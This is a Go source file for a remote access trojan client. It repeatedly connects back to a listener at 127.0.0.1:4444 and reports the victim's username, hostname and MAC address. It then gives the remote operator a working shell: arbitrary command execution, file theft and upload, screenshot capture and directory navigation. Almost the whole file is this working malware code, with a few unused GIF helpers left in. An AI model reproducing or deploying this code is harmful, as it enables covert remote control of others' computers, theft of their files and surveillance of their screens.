package main

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"image"
	"image/color/palette"
	"image/draw"
	"image/gif"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"
	"github.com/kbinani/screenshot"
)

func reliableSend(sock net.Conn, data map[string]interface{}) {
	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error while marshalling:", err)
		return
	}
	length := uint32(len(jsonData))
	lengthBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(lengthBytes, length)
	_, err = sock.Write(lengthBytes)
	if err != nil {
		return
	}
	_, err = sock.Write(jsonData)
	if err != nil {
		return
	}
}
func reliableRecv(sock net.Conn) (map[string]interface{}, error) {
	lengthBytes := make([]byte, 4)
	_, err := io.ReadFull(sock, lengthBytes)
	if err != nil {
		return nil, err
	}
	length := binary.BigEndian.Uint32(lengthBytes)
	dataBytes := make([]byte, length)
	_, err = io.ReadFull(sock, dataBytes)
	if err != nil {
		return nil, err
	}
	var jsonData map[string]interface{}
	err = json.Unmarshal(dataBytes, &jsonData)
	return jsonData, err
}
func getUsername() (string, error) {
	currentUser, err := user.Current()
	if err != nil {
		return "", err
	}
	return currentUser.Username, nil
}
func getHostname() (string, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return "", err
	}
	return hostname, nil
}
func getMACAddress() (string, error) {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}
	var macAddress string
	for _, iface := range interfaces {
		if iface.HardwareAddr != nil {
			macAddress = iface.HardwareAddr.String()
			break
		}
	}
	return macAddress, nil
}
func sendFile(sock net.Conn, filename string) error {
	file, err := os.Open(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	fileInfo, err := file.Stat()
	if err != nil {
		return err
	}
	fileSize := make([]byte, 8)
	fileSizeInt := fileInfo.Size()
	for i := 0; i < 8; i++ {
		fileSize[i] = byte(fileSizeInt & 0xff)
		fileSizeInt >>= 8
	}
	_, err = sock.Write(fileSize)
	if err != nil {
		return err
	}
	buffer := make([]byte, 4096)
	for {
		numBytes, err := file.Read(buffer)
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}

		_, err = sock.Write(buffer[:numBytes])
		if err != nil {
			return err
		}
	}

	return nil
}
func recvFile(sock net.Conn, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	fileSizeBuffer := make([]byte, 8)
	_, err = io.ReadFull(sock, fileSizeBuffer)
	if err != nil {
		return err
	}

	fileSizeInt := int64(0)
	for i := 7; i >= 0; i-- {
		fileSizeInt <<= 8
		fileSizeInt |= int64(fileSizeBuffer[i])
	}
	buffer := make([]byte, 4096)
	var totalBytesReceived int64
	for totalBytesReceived < fileSizeInt {
		numBytes, err := sock.Read(buffer)
		if err != nil {
			return err
		}

		totalBytesReceived += int64(numBytes)
		_, err = file.Write(buffer[:numBytes])
		if err != nil {
			return err
		}
	}
	return nil
}
func sendClientInfo(sock net.Conn) {
	username, err := getUsername()
	if err != nil {
		return
	}

	hostname, err := getHostname()
	if err != nil {
		return
	}

	macAddress, err := getMACAddress()
	if err != nil {
		return
	}
	inf := map[string]interface{}{
		"username":   username,
		"hostname":   hostname,
		"macAddress": macAddress,
	}

	reliableSend(sock, inf)
}
func ch_down(sock net.Conn, filename string) {
	_, err := os.Stat(filename)
	if err == nil {
		reliableSend(sock, map[string]interface{}{
			"response": fmt.Sprintf("\nFile Exists"),
		})
		time.Sleep(200 * time.Millisecond)
		err = sendFile(sock, filename)
		if err != nil {
			return
		}
	} else if os.IsNotExist(err) {
		reliableSend(sock, map[string]interface{}{
			"response": fmt.Sprintf("\nFile Not Found"),
		})
		return
	} else {
		reliableSend(sock, map[string]interface{}{
			"response": fmt.Sprintf("Some"),
		})
		return
	}
}
func shell(sock net.Conn) {
	currentPath, err := os.Getwd()
	if err != nil {
		return
	}
	for {
		commandData, err := reliableRecv(sock)
		if err != nil {
			break
		}
		command := commandData["command"].(string)
		if command == "q" {
			continue
		} else if command == "kill" {
			sock.Close()
			break
		} else if command == "info" {
			username, err := getUsername()
			if err != nil {
				return
			}

			hostname, err := getHostname()
			if err != nil {
				return
			}

			macAddress, err := getMACAddress()
			if err != nil {
				return
			}
			inf := map[string]interface{}{
				"username":   username,
				"hostname":   hostname,
				"macAddress": macAddress,
			}

			reliableSend(sock, inf)

		} else if command == "cd .." {
			os.Chdir("..")
			newCurrentPath, _ := os.Getwd()
			reliableSend(sock, map[string]interface{}{
				"response": fmt.Sprintf("\nCurrent directory changed to: %s", newCurrentPath),
			})
			currentPath = newCurrentPath
		} else if strings.HasPrefix(command, "screen") {
			currentTime := time.Now().Format("2006-01-02-15-04-05")
			bounds := screenshot.GetDisplayBounds(0)
			img, err := screenshot.CaptureRect(bounds)
			if err != nil {
				return
			}
			tempDir := currentPath
			screenshotFilename := fmt.Sprintf("%s.png", currentTime)
			screenshotPath := filepath.Join(tempDir, screenshotFilename)
			file, err := os.Create(screenshotPath)
			if err != nil {
				return
			}
			defer file.Close()
			if err := png.Encode(file, img); err != nil {
				return
			}
			reliableSend(sock, map[string]interface{}{
				"response": fmt.Sprintf("\nScreenshot saved to:: %s", screenshotPath),
			})
		} else if strings.HasPrefix(command, "download ") {
			filename := command[9:]
			ch_down(sock, filename)
		} else if strings.HasPrefix(command, "upload ") {
			filename := command[7:]
			err = recvFile(sock, filename)
			if err != nil {
				return
			}
			continue
		} else if strings.HasPrefix(command, "cd ") {
			foldername := command[3:]
			if strings.HasPrefix(foldername, "~/") {
				homeDir, _ := os.UserHomeDir()
				foldername = filepath.Join(homeDir, foldername[2:])
			}
			err := os.Chdir(foldername)
			if err != nil {
				reliableSend(sock, map[string]interface{}{
					"response": fmt.Sprintf("Error changing directory: %s", err),
				})
			} else {
				newpath, _ := os.Getwd()
				reliableSend(sock, map[string]interface{}{
					"response": fmt.Sprintf("\nCurrent directory changed to: %s", newpath),
				})
				currentPath = newpath
			}
		} else {
			var cmd *exec.Cmd
			if runtime.GOOS == "windows" {
				cmd = exec.Command("cmd", "/c", command)
			} else {
				cmd = exec.Command("sh", "-c", command)
			}
			output, err := cmd.CombinedOutput()
			if err != nil {
				fmt.Println("Error executing command:", err)
			}
			reliableSend(sock, map[string]interface{}{
				"response": string(output),
			})
		}

	}
}

type GifEncoder struct {
	Image []*image.Paletted
	Delay []int
}

func (ge *GifEncoder) Save(file *os.File) error {
	return gif.EncodeAll(file, &gif.GIF{
		Image: ge.Image,
		Delay: ge.Delay,
	})
}
func convertToPaletted(img image.Image) *image.Paletted {
	bounds := img.Bounds()
	palettedImg := image.NewPaletted(bounds, palette.Plan9)

	draw.Draw(palettedImg, bounds, img, bounds.Min, draw.Over)

	return palettedImg
}
func connect() {
	for {
		sock, err := net.Dial("tcp", "127.0.0.1:4444")
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		sendClientInfo(sock)
		shell(sock)
		sock.Close()
		time.Sleep(5 * time.Second)
	}
}
func main() {
	connect()
}
